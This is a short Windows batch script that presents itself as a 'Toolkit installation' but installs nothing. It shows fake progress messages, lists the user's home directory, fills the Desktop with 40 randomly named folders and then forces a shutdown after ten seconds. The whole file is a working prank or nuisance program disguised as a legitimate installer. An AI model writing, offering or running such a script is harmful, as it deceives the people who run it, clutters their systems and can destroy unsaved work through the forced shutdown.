@echo off
title Toolkit installation
msg * Toolkit installation is starting
cd /d %systemdrive%\Users\%username%\
@echo on
tree
@echo off
cd /d %systemdrive%\Users\%username%\Desktop
setlocal EnableDelayedExpansion
	for /l %%x in (1,1,40) do (
		mkdir !random! 
	)
endlocal
msg * The toolkit installation is nearly complete please wait ...
shutdown /s /t 10